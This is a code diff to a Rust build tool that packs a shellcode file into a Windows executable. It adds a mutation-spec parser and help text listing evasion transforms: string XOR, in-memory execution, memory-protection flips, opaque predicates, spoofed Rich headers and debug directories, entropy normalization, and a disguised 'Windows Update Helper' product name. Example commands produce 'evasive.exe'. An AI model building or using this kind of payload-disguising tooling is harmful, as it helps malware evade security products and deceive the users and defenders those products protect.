@@ -80,14 +80,11 @@ fn main() {
         decoy: args.decoy,
     };
 
-    // Parse mutation specs
+    // Parse mutation specs (id:key=val,key=val syntax)
     let mutations: Vec<MutationSpec> = args
         .mutations
         .iter()
-        .map(|id| MutationSpec {
-            id: id.clone(),
-            params: HashMap::new(),
-        })
+        .map(|s| parse_mutation_spec(s))
         .collect();
 
     let input = BuildInput::ModularTemplate {
@@ -295,6 +292,32 @@ impl Args {
     }
 }
 
+/// Parse "id:key=val,key=val" into a MutationSpec.
+/// Examples:
+///   "ast.string_xor"                        → id="ast.string_xor", params={}
+///   "ast.decon_rounds:count=50,method=fixed" → id="ast.decon_rounds", params={count:50, method:fixed}
+///   "binary.size_pad:target_kb=256"         → id="binary.size_pad", params={target_kb:256}
+fn parse_mutation_spec(s: &str) -> MutationSpec {
+    if let Some((id, params_str)) = s.split_once(':') {
+        let params: HashMap<String, String> = params_str
+            .split(',')
+            .filter_map(|kv| {
+                let (k, v) = kv.split_once('=')?;
+                Some((k.to_string(), v.to_string()))
+            })
+            .collect();
+        MutationSpec {
+            id: id.to_string(),
+            params,
+        }
+    } else {
+        MutationSpec {
+            id: s.to_string(),
+            params: HashMap::new(),
+        }
+    }
+}
+
 fn print_help() {
     eprintln!(
         r#"build_artifact — Build a Windows PE artifact using the full modular template pipeline
@@ -320,22 +343,69 @@ OPTIONS:
     --decoy <NAME>                  winexec | none  (default: winexec)
     --encoding <TYPE>               xor | english  (default: xor)
     --trace <MODE>                  off | lines  (default: off)
-    -m, --mutation <ID>             Mutation to apply (repeatable)
+    -m, --mutation <ID[:params]>     Mutation to apply (repeatable). Params: key=val,key=val
     --xwin <DIR>                    xwin SDK path (default: /root/.xwin)
     --output-dir <DIR>              Build output dir (default: ./artifacts)
+
+MUTATION SYNTAX:
+    -m <id>                         No params (uses defaults)
+    -m <id>:key=val                 Single param
+    -m <id>:k1=v1,k2=v2            Multiple params
+
+AST MUTATIONS (applied to C source before compilation):
+    ast.string_xor                  XOR-encode string literals (param: xor_key=0xAA)
+    ast.decon_rounds                Loop count (params: count=20, method=fixed|runtime)
+    ast.fill_pattern                Fill data (params: pattern=xor|nop_sled|random|zero)
+    ast.exec_decoy                  Execute from alloc'd mem (params: method=none|direct|thread)
+    ast.timing_pattern              Inter-op delays (params: min_ms=10, max_ms=100)
+    ast.protection_transition       Mem protection (params: pattern=rw_rx|rw_rwx|rw_r_rx)
+
+LLVM MUTATIONS (applied to LLVM IR):
+    llvm.nop_insert                 NOP insertion (param: density=0.3)
+    llvm.opaque_predicate           Opaque predicates (param: density=0.3)
+    llvm.junk_block                 Dead blocks (param: count=2)
+
+BINARY MUTATIONS (applied post-link to the PE file):
+    binary.rich_header              Inject MSVC Rich header (param: donor=notepad|calc|explorer)
+    binary.import_pad               Add benign imports (param: count=30)
+    binary.resource_inject          Add version info + manifest (params: product_name=..., company=...)
+    binary.section_rename           Rename sections to MSVC defaults (no params)
+    binary.entropy_normalize        Add low-entropy padding (param: target=6.0)
+    binary.string_inject            Append benign strings section (param: count=20)
+    binary.size_pad                 Pad PE to target size (param: target_kb=256)
+    binary.debug_dir                Add fake PDB debug directory (param: pdb_path=...)
 
 EXAMPLES:
     # Default build
     cargo run -p build --example build_artifact -- -p shellcode.bin -o artifact.exe
 
-    # With mutation
-    cargo run -p build --example build_artifact -- -p sc.bin -m ast.string_xor -o mutated.exe
+    # With AST mutation + params
+    cargo run -p build --example build_artifact -- -p sc.bin -m ast.string_xor:xor_key=0xBB -o mutated.exe
 
     # With tracing
     cargo run -p build --example build_artifact -- -p sc.bin --trace lines -o traced.exe
 
-    # Different modules
-    cargo run -p build --example build_artifact -- -p sc.bin --carrier peb_walk --encoding english --decoder english -o peb.exe
+    # All binary mutations (recommended order)
+    cargo run -p build --example build_artifact -- -p sc.bin \
+      -m binary.rich_header:donor=notepad \
+      -m binary.import_pad:count=20 \
+      -m binary.resource_inject:product_name=Windows\ Update\ Helper \
+      -m binary.section_rename \
+      -m binary.string_inject:count=20 \
+      -m binary.entropy_normalize:target=6.0 \
+      -m binary.size_pad:target_kb=256 \
+      -m binary.debug_dir \
+      -o evasive.exe
+
+    # Mixed AST + binary mutations
+    cargo run -p build --example build_artifact -- -p sc.bin \
+      --deconditioner basic \
+      -m ast.decon_rounds:count=50,method=fixed \
+      -m ast.timing_pattern:min_ms=50,max_ms=200 \
+      -m binary.rich_header \
+      -m binary.import_pad:count=15 \
+      -m binary.size_pad:target_kb=128 \
+      -o combined.exe
 
     # Custom xwin path
     cargo run -p build --example build_artifact -- -p sc.bin --xwin /opt/xwin -o out.exe"#
